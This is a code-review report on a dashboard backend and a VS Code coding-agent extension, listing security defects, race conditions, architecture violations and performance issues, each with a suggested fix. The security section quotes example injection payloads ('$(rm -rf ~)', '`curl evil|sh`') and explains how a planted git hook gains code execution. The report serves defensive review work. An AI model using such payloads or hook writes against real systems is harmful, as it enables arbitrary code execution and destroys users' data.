# Phase 7 — Code Review & Feedback

> **Scope:** Read-only review of the dashboard backend (`dashboard/app`), the
> VS Code extension (`extension/src`) and supporting configuration. **No code
> was changed** — this document is feedback only.
>
> **Themes reviewed:** Security · Naming · Performance · Architecture · SOLID ·
> DRY · Dependency · Bugs · Smells · Refactor suggestions.

Severity legend: 🔴 Critical · 🟠 High · 🟡 Medium · 🔵 Low / Nit.

---

## 0. Executive summary

The codebase is well-structured, readable, and consistently follows the Clean
Architecture *layout*. Tests are offline-deterministic (good). However there are
several **real security defects** (two of them lead to arbitrary code execution
on the developer machine, plus broken object-level authorization on the bridge),
a **non-functional timeout** in the orchestrator, **non-atomic task claiming**
(double-dispatch race), and a recurring **Clean-Architecture violation** where
the `application` layer imports `infrastructure` directly. Addressing the 🔴/🟠
items below should be prioritized before this is run against untrusted input.

| Area | 🔴 | 🟠 | 🟡 | 🔵 |
|------|----|----|----|----|
| Security | 2 | 3 | 2 | 1 |
| Architecture / SOLID | 0 | 2 | 3 | 1 |
| Performance | 0 | 2 | 3 | 0 |
| Bugs / Correctness | 1 | 3 | 4 | 1 |
| DRY / Smells / Naming | 0 | 0 | 6 | 6 |

---

## 1. Security

### 🔴 S1 — Shell command injection / RCE via commit message
**File:** [extension/src/agent/git.ts](../extension/src/agent/git.ts#L40-L49)

```ts
const message = renderMessage(messageTemplate, vars); // vars include server-controlled task.title
const safe = message.replace(/"/g, '\\"');
await git(`commit -m "${safe}"`, root);
```

The message is interpolated into a double-quoted shell string with **only `"`
escaped**. Inside double quotes the shell still expands `` `...` `` and `$(...)`.
`vars.title` / `vars.task_key` come from the dashboard (`finishSuccess` →
`commitAll`), so a task title such as `"$(rm -rf ~)"` or `` `curl evil|sh` ``
executes arbitrary commands on the developer's machine.
**Fix direction:** pass the message via `execFile("git", ["commit","-m",message])`
(argv array, no shell), or write the message to a file and use `-F`.

### 🔴 S2 — Agent can write into `.git/` → RCE via git hooks
**File:** [extension/src/agent/apply.ts](../extension/src/agent/apply.ts#L19-L27)

`safeResolve` correctly blocks escaping the workspace root, but it permits any
path *inside* it — including `.git/hooks/pre-commit`, `.git/config`, etc. The
agent immediately runs `git add -A && git commit` afterwards, which **executes
any hook the model just wrote**. The `.git/` directory (and arguably other
sensitive paths) must be denied. Also consider blocking writes to files outside
a configurable allow-list and capping file size/count.

### 🟠 S3 — Broken object-level authorization on the bridge (IDOR)
**Files:** [agent_bridge.py](../dashboard/app/application/services/agent_bridge.py#L181-L189),
[coding_agent.py](../dashboard/app/application/services/coding_agent.py#L186-L195)

Every push/sync/context/session method authorizes with only
`rbac.require(actor_id, "agent:bridge")` — **no `workspace_id`, no ownership
check** that the `run_id`/`session_id` belongs to the caller's workspace or that
the caller claimed the run. Because `effective_permissions(.., None)` only
resolves *global* assignments, any principal holding `agent:bridge` can
`sync`, `get_context`, `push_error`, `record_attempt`, `finish_session`, etc.
against **any run/session in any workspace** by guessing the id. The same gap
exists in `OrchestratorService.get_run` / `list_runs` / `run_logs`
(`orchestration:read` with no workspace scoping). Enforce that the loaded
row's `workspace_id` is one the actor is authorized for.

### 🟠 S4 — Hardcoded fallback session secret in production
**File:** [main.py](../dashboard/app/main.py#L46-L52)

```python
ui.run_with(app, storage_secret=settings.supabase_jwt_secret or "dev-storage-secret", ...)
```

If `supabase_jwt_secret` is unset, NiceGUI signs session storage with the
predictable literal `"dev-storage-secret"`. Two problems: (1) a guessable secret
in any misconfigured deploy, and (2) **reusing the JWT verification secret as the
UI storage secret** couples two trust domains — rotating one breaks the other,
and a storage-secret leak compromises token verification. Use a dedicated,
required secret and fail fast in production when it is missing.

### 🟠 S5 — `tata.compileCommand` / `tata.testCommand` run via shell `exec`
**File:** [extension/src/agent/compile.ts](../extension/src/agent/compile.ts#L17-L29)

Commands are executed with `exec(command, …)` (full shell) on
model-generated code. The command strings are user settings (lower risk), but
combined with S2 the threat is concrete. Prefer `execFile`/argv where possible
and document that these settings execute arbitrary code. At minimum require an
explicit user opt-in before the first run.

### 🟡 S6 — Symlink escape not covered by path guard
**File:** [apply.ts](../extension/src/agent/apply.ts#L19-L27)

`safeResolve` compares string prefixes but does not resolve symlinks. A symlink
already present in the workspace pointing outside it would let a write escape.
Consider `fs.realpath` on the parent dir before writing, or refuse to follow
symlinks.

### 🟡 S7 — Inconsistent DB error mapping leaks 500s
**File:** [repository.py](../dashboard/app/infrastructure/supabase/repository.py#L78-L84)

`_map_error` only translates unique-violation `23505` → `ConflictError`. FK
(`23503`), check (`23514`) and RLS-denied (`42501`) surface as raw `APIError`
(HTTP 500) instead of a clean 409/422/403 — both a UX and an
information-disclosure concern (raw driver messages reach the client).

### 🔵 S8 — CORS wildcard methods/headers with credentials
**File:** [main.py](../dashboard/app/main.py#L24-L30)

`allow_methods=["*"]`, `allow_headers=["*"]`, `allow_credentials=True`. Origins
are explicit (good), but there is no validation preventing `cors_origins="*"`,
which combined with credentials is invalid/insecure. Validate the origin list
and avoid `"*"` whenever credentials are allowed.

---

## 2. Bugs / Correctness

### 🔴 B1 — Orchestrator timeout does not actually time out
**File:** [orchestrator.py](../dashboard/app/application/services/orchestrator.py#L246-L250)

```python
def _run_with_timeout(self, run, timeout):
    with ThreadPoolExecutor(max_workers=1) as pool:
        future = pool.submit(self._executor.execute, run)
        return future.result(timeout=timeout)
```

`future.result(timeout=...)` raises `FuturesTimeout`, but leaving the `with`
block calls `pool.shutdown(wait=True)`, which **blocks until the runaway task
finishes anyway**. So the "timeout" neither bounds wall-clock time nor cancels
the work (Python can't kill the thread). The TIMED_OUT state is recorded while
the work may still be mutating state in the background → ineffective control +
potential double side effects. Needs a cancellable executor (subprocess, or a
cooperative cancellation token).

### 🟠 B2 — Non-atomic task claim → double dispatch (race)
**Files:** [agent_bridge.py `pull_next`](../dashboard/app/application/services/agent_bridge.py#L48-L82),
[orchestrator.py `_schedule`](../dashboard/app/application/services/orchestrator.py#L168-L213)

Both read candidate rows and *then* `update` them to `RUNNING`/`QUEUED`. Two
concurrent workers (or the orchestrator + a bridge worker) can read the same
`PENDING` run and both claim it. There is no conditional/optimistic update
(`UPDATE … WHERE state='pending'`) and no row lock. Result: the same task runs
twice. Use a guarded update and treat "0 rows affected" as "already claimed".

### 🟠 B3 — Two competing schedulers over the same `task_runs`
**Files:** orchestrator.py and agent_bridge.py

`OrchestratorService` auto-executes runs (StubExecutor) while
`AgentBridgeService.pull_next` hands the *same* `PENDING` rows to external
workers, and each increments `attempts` with different semantics. For a given
bundle both can drive the state machine simultaneously, producing conflicting
attempt counts and states. The ownership/coordination between the two paths
needs to be made explicit (e.g. a per-run `execution_mode`).

### 🟠 B4 — `enqueue` crashes on unknown category string
**File:** [orchestrator.py](../dashboard/app/application/services/orchestrator.py#L104-L110)

```python
default=TaskCategory(task.get("category", TaskCategory.BACKEND.value))
```

If a task artifact carries an unrecognized `category` string, `TaskCategory(...)`
raises `ValueError`, aborting the whole enqueue loop (partial runs may already be
created → inconsistent state). Validate/normalize against the enum with a safe
fallback.

### 🟡 B5 — `resume` resets in-flight RUNNING runs to PENDING
**File:** [orchestrator.py](../dashboard/app/application/services/orchestrator.py#L150-L165)

`resume` flips `RUNNING` (and `DEAD`) back to `PENDING`. If a bridge worker is
actively pushing to that run, resetting it orphans the worker and re-queues live
work (combines with B2/B3). Resume should only reset states that are provably not
in flight.

### 🟡 B6 — `parseFileEdits` breaks on nested code fences
**File:** [llm.ts](../extension/src/agent/llm.ts#L120-L135)

The `FENCE` regex is non-greedy on ```` ``` ````; a generated file that itself
contains a fenced block (very common for Markdown/docs tasks) terminates parsing
early and writes a truncated file. Consider a more robust block parser or require
a length/sentinel protocol.

### 🟡 B7 — `push_complete` records the wrong audit action
**File:** [agent_bridge.py](../dashboard/app/application/services/agent_bridge.py#L150-L165)

Completion is audited as `AuditAction.DISPATCH`, which corrupts the audit trail
semantics. Use a `COMPLETE`/`SUCCEED` action.

### 🟡 B8 — Silent truncation at `limit=500/200`
**Files:** throughout services (`list(... limit=500)`)

Dependency resolution, scheduling and summaries assume the whole bundle fits in
500 rows. A bundle with >500 tasks is silently truncated, breaking dependency
graphs with no error. Paginate or assert the bound.

### 🔵 B9 — Non-null assertion can crash the agent
**File:** [agent.ts](../extension/src/agent/agent.ts#L137-L145)

`vscode.workspace.workspaceFolders![0].uri` uses `!`. Although context-gathering
checks earlier, the assertion is fragile; reuse the already-resolved
`ctx.workspaceRoot` instead.

---

## 3. Architecture / SOLID

### 🟠 A1 — `application` depends directly on `infrastructure` (Clean Arch violation)
**Files:** [rbac.py](../dashboard/app/application/rbac.py#L6),
[recorder.py](../dashboard/app/application/recorder.py#L8), and every service's
`_repo()` helper.

The stated principle is "dependencies point inward", yet `rbac.py`,
`recorder.py`, `orchestrator.py`, `agent_bridge.py`, `coding_agent.py` and
`tech_spec.py` all `import … from app.infrastructure.supabase.client import
get_service_client`. The application layer is hard-wired to Supabase. This breaks
the dependency rule and makes the cross-cutting concerns (RBAC, audit, events)
untestable without the real client. Introduce ports (e.g. an `AuditSink`, an
`AuthzProvider`, a repository factory) injected from the composition root.

### 🟠 A2 — Global singletons defeat DI (DIP)
**Files:** `rbac = RBAC()` ([rbac.py](../dashboard/app/application/rbac.py#L70)),
`@lru_cache get_service_client()`/`get_settings()`.

`CrudService` and all services call the module-global `rbac` and module-global
client factory directly rather than receiving them via the constructor. Fakes
must monkey-patch globals instead of being injected. Make RBAC and the
audit/event recorder constructor dependencies.

### 🟡 A3 — `OrchestratorService` has too many responsibilities (SRP)
One ~330-line class owns enqueue, classification wiring, the dependency-aware
scheduler, the thread-pool execution, retry, timeout, cancel, summary and
logging. Splitting the *scheduler* (pure planning over an in-memory graph) from
the *executor/IO* would make both testable and shrink the blast radius of B1–B3.

### 🟡 A4 — Repository port leaks query semantics
**File:** [repository.py](../dashboard/app/infrastructure/supabase/repository.py#L24-L48)

`list(filters=…)` only supports equality and a single `order_by`; callers encode
Supabase-specific assumptions (e.g. `find_one` semantics). Anything needing `in`,
`or`, or composite ordering bypasses the port (see RBAC reaching into the raw
client). The port should either grow a small query spec or such reads should live
behind dedicated repository methods.

### 🟡 A5 — Mutating-parameter side effect
**File:** [orchestrator.py `_set_state`](../dashboard/app/application/services/orchestrator.py#L300-L315)

`_set_state(..., by=run)` does `by.update(updated)`, silently mutating the
caller's dict as a hidden side effect. This makes the scheduler loop's state hard
to reason about. Return the updated row and let the caller reassign explicitly.

### 🔵 A6 — Unused "review" path retained
Phase 6 is explicitly "no review", yet `push_review` / `/review` endpoints remain
wired and unused by the agent. Not harmful, but dead surface area worth pruning or
documenting as "external use only".

---

## 4. Performance

### 🟠 P1 — RBAC issues 2 queries on every guarded call, no caching
**File:** [rbac.py](../dashboard/app/application/rbac.py#L17-L52)

`effective_permissions` runs two round trips (`user_roles`, then
`role_permissions`) and is invoked on **every** service method, including each
iteration of scheduler loops. There is no per-request memoization. For a single
`list` endpoint that is two extra queries; for orchestration it multiplies. Cache
per request (FastAPI dependency scope) and/or collapse to one join.

### 🟠 P2 — `pull_next` re-lists the whole bundle per candidate
**File:** [agent_bridge.py `_deps_satisfied`](../dashboard/app/application/services/agent_bridge.py#L197-L205)

For each PENDING candidate, `_deps_satisfied` fetches **all** sibling runs
(`limit=500`) again → O(candidates × full-list) queries to claim one task. Fetch
the bundle's runs once and resolve dependencies in memory.

### 🟡 P3 — Chatty scheduler (per-state-change round trips)
**File:** orchestrator.py `_schedule`/`_execute_one`

Each state transition is its own `update`, each log line its own `insert`, and
`_summary` re-lists the bundle. Batch state writes / logs where possible.

### 🟡 P4 — Nested thread pools per task
`_schedule` opens a batch pool, and `_run_with_timeout` opens a *new* single
-thread pool per task inside it. Combined with B1 this both leaks threads and
serializes on shutdown. A single managed executor would be cheaper and correct.

### 🟡 P5 — `import time` inside the retry loop
**File:** [orchestrator.py](../dashboard/app/application/services/orchestrator.py#L238-L242)

Local `import time` in the hot retry path. Move to module scope.

---

## 5. DRY

| # | Duplication | Locations |
|---|-------------|-----------|
| D1 | `_TERMINAL = {SUCCEEDED, CANCELLED, DEAD}` | orchestrator.py, agent_bridge.py, coding_agent.py |
| D2 | `_PRIORITY_RANK` map | orchestrator.py, agent_bridge.py |
| D3 | `_repo(table)` factory helper | orchestrator.py, agent_bridge.py, coding_agent.py, tech_spec.py |
| D4 | `_log()` task-log insert | orchestrator.py, agent_bridge.py (identical) |
| D5 | `_event()` event emit | agent_bridge.py, coding_agent.py |
| D6 | Dependency-satisfied logic | orchestrator.py `_schedule` vs agent_bridge.py `_deps_satisfied` (subtly different — divergence risk) |
| D7 | `exec`→Promise wrapper | extension compile.ts `run()` and git.ts `git()` |

Extract these into shared helpers/constants (e.g. a `run_state` module and a
`TaskLogWriter`) so the two schedulers can't drift (which already feeds B2/B3).

---

## 6. Code smells / Naming

- 🔵 **N1** `_t()` ([repository.py](../dashboard/app/infrastructure/supabase/repository.py#L21-L22)) — cryptic; `_table_query()` reads better.
- 🔵 **N2** `by=` parameter name in `_set_state` is opaque and (per A5) mutates.
- 🔵 **N3** `push_complete` → `AuditAction.DISPATCH` (see B7) — misleading.
- 🔵 **N4** Doc/code naming drift: prose refers to `TaskState`; code uses `RunState`.
- 🔵 **N5** `safe()` (agent.ts) is a very generic name for "swallow errors".
- 🟡 **N6** Magic numbers everywhere: `limit=500/200`, `maxBuffer 10*1024*1024`, tree `depth=2`, progress math `25 + round(i/n*50)`. Name them.
- 🟡 **N7** `assert last_exc is not None` in [retry.py](../dashboard/app/application/retry.py#L41) — `assert` is stripped under `python -O`; raise explicitly.
- 🟡 **N8** Mid-file `from nicegui import ui  # noqa: E402` in main.py — pragmatic but a smell; isolate UI mounting in a function.
- 🟡 **N9** `record_audit`/`record_event` swallow **all** exceptions silently — acceptable for resilience, but audit gaps become invisible (compliance risk). Consider a metrics counter / dead-letter.
- 🟡 **N10** Broad `except Exception` in tech_spec `generate` and auth.py — fine, but narrow where feasible.

---

## 7. Dependencies

- 🟡 **DEP1** `python-jose` has a history of CVEs; confirm the pinned version in
  `pyproject.toml` is current, or migrate to `pyjwt`.
- 🔵 **DEP2** Synchronous `supabase-py` is called from FastAPI handlers. Handlers
  are sync `def` (so FastAPI offloads to a threadpool) — currently consistent and
  fine; keep it that way (don't mix `async def` with the blocking client).
- 🔵 **DEP3** Extension relies on global `fetch` (Node 18+) — fine for engine
  `^1.90`, but assert the engine floor stays ≥ that.
- 🔵 **DEP4** Per repo memory, `mypy` reports ~34 pre-existing errors and there are
  `# type: ignore[misc]` spots (e.g. tech_spec `result.value` unpack). Worth a
  type-cleanliness pass so new regressions are visible.

---

## 8. Suggested remediation order

1. 🔴 **S1, S2** — close the two RCE paths in the extension (argv-based git,
   block `.git/` writes). Highest real-world risk.
2. 🟠 **S3** — add workspace/ownership checks to bridge & orchestration reads.
3. 🔴 **B1** + 🟠 **B2/B3** — make execution control correct: cancellable timeout,
   atomic claim, and a single owner of the `task_runs` state machine.
4. 🟠 **S4** — required, dedicated session secret.
5. 🟠 **A1/A2** + **D1–D6** — introduce ports for client/RBAC/audit and dedupe the
   shared state constants/helpers (this also structurally prevents B3 drift).
6. 🟠 **P1/P2** — cache RBAC per request; resolve dependencies from a single fetch.
7. Remaining 🟡/🔵 items as cleanup.

---

## 9. What's already good

- Clear layer separation and naming at the package level; easy to navigate.
- Offline `StubLLMClient` / `StubTaskExecutor` keep the whole pipeline testable
  without external services — excellent for CI.
- Path-traversal guard in `apply.ts` (covers the common case), token stored in
  VS Code `SecretStorage`, JWT audience verification enabled.
- Audit/event emission is centralized and resilient (doesn't break requests).
- Pydantic schemas at the API boundary; consistent exception → HTTP mapping for
  `AppError`.
- Dependency-injectable repositories in service constructors (the *services* are
  testable even though the cross-cutting globals are not).
